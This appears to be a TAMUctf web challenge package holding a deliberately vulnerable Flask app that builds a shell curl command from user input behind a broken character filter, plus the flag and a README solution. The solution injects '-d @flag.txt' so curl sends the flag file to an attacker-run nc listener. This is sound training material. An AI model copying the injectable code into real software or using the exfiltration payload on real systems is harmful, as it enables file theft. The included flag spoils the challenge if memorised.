{
    "Dockerfile": "FROM python:3.8-slim-buster\n\nCOPY src/ /\nCOPY flag.txt /\nRUN apt update -y && apt upgrade -y && apt install -y curl && pip3 install flask\n\nENTRYPOINT [\"python3\", \"/app.py\"]\n",
    "flag.txt": "gigem{p00r_f1lt3rs_m4k3_f0r_p00r_s3cur1ty}\n",
    "Makefile": "NAME := connect\nPORT := 8001\n\nrun:\n\tdocker build -t $(NAME) .\n\tdocker run --read-only -d --restart=always --name $(NAME) -p $(PORT):80 $(NAME)\n\nstop:\n\tdocker container rm -f $(NAME)\n\ndist:\n\tzip -r $(NAME).zip src\n",
    "README.md": "# Connect\n\nAuthor: `Mr. Blade`\n\n## Description\n\nI built a tool to test if websites are alive. Can you test it for me?\n\nNote: the flag is located in /flag.txt\n\n## Dev Notes\n\n<b>SOURCE CODE IS PROVIDED</b><br>\nAll files in `src/` are to be included in the challenge\n\nStart: `make run`\n\nStop: `make stop`\n\n## Solution\n\ncurl allows for the upload of file data. We can abuse this as neither `-` nor `@` are filtered.\n\nOn a publicly-facing server, start an nc server:\n\n```bash\nnc -nvlp 1337\n```\n\nThen, on the web page, delete the check for valid URL:\n\n```js\ntry {\n  new URL(host);\n} catch {\n  return output.innerHTML = \"Illegal Characters Detected\";\n}\n```\n\nFinally, we trick curl into uploading data using `-d @file` to POST the content of `file` to our malicious server. We submit the following \"IP\" (crafted payload) to check:\n\n```bash\n-d @flag.txt http://172.17.0.1:1337\n```\n\nThis causes the following data to be POST'd to our nc session:\n\n```\nNcat: Version 7.93 ( https://nmap.org/ncat )\nNcat: Listening on :::1337\nNcat: Listening on 0.0.0.0:1337\nNcat: Connection from 172.17.0.3.\nNcat: Connection from 172.17.0.3:37624.\nPOST / HTTP/1.1\nHost: 172.17.0.1:1337\nUser-Agent: curl/7.64.0\nAccept: */*\nContent-Length: 42\nContent-Type: application/x-www-form-urlencoded\n\ngigem{p00r_f1lt3rs_m4k3_f0r_p00r_s3cur1ty}\n```\n",
    "src\\app.py": "import flask\nimport os\n\ndef escape_shell_cmd(data):\n    for char in data:\n        if char in '&#;`|*?~<>^()[]{}$\\\\':\n            return False\n        else:\n            return True\n\napp = flask.Flask(__name__)\n\n@app.route('/', methods=['GET'])\ndef index():\n    return flask.render_template('index.html')\n\n@app.route('/api/curl', methods=['POST'])\ndef curl():\n    url = flask.request.form.get('ip')\n    if escape_shell_cmd(url):\n        command = \"curl -s -D - -o /dev/null \" + url + \" | grep -oP '^HTTP.+[0-9]{3}'\"\n        output = os.popen(command).read().strip()\n        if 'HTTP' not in output:\n            return flask.jsonify({'message': 'Error: No response'})\n        return flask.jsonify({'message': output})\n\n    else:\n        return flask.jsonify({'message': 'Illegal Characters Detected'})\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)\n\n",
    "src\\static\\main.js": "var input = document.getElementById('command');\nvar output = document.getElementById(\"console-output\");\n\ndocument.getElementById(\"command\").addEventListener('keydown', (e) => {\n  if (e.keyCode === 13) {\n\n    let host = input.value;\n\n    try {\n      new URL(host);\n    } catch {\n      return output.innerHTML = \"Illegal Characters Detected\";\n    }\n\n    output.innerHTML = '';\n\n    fetch('/api/curl', {\n      method: 'POST',\n      body: `ip=${host}`,\n      headers: {\n        'Content-Type': 'application/x-www-form-urlencoded'\n      }\n    })\n    .then(resp => resp.json())\n    .then(data => {\n      output.innerHTML = data.message;\n    });\n\n    input.value = '';\n  }\n});\n",
    "src\\static\\style.css": "body {\n    size: 25px;\n    background-color: #f1faee;\n    color: #f1faee;\n}\n\n.container {\n    padding-top: 100px;\n}\n\n.forum {\n    margin-left: 35%;\n    margin-right: 35%;\n    padding-top: 35px;\n    padding-bottom: 50px;\n    background-color: #457b9d;\n    border-radius: 20px;\n}\n\n.input {\n    margin-right: 36px;\n    padding-left: 12px;\n    color: white;\n    size: 20px;\n    height: 25px;\n    background-color: #1d3557;\n    border: none;\n    border-radius: 15px;\n    box-shadow: 0px 0px 10px #1d3557;\n}\n\n.output {\n    color: white;\n    margin-top: 20px;\n    background-color: #457b9d;\n    border: none;\n    resize: none;\n    width: 80%\n}\n",
    "src\\templates\\index.html": "<!DOCTYPE html>\n<html>\n    <head>\n        <title>Connect - TAMUctf</title>\n        <link rel=\"stylesheet\" href=\"static/style.css\"/>\n    </head>\n    <body>\n        <center>\n            <div class=\"container\">\n                <div class=\"forum\">\n                    <p>Enter a valid URL</p>\n                    <label>URL: </label><input class=\"input\" id=\"command\"></input><br>\n                    <textarea class=\"output\" id=\"console-output\" readonly></textarea>\n                </div>\n            </div>\n        </center>\n    </body>\n    <script src=\"static/main.js\"></script>\n</html>\n",
    "category": "web"
}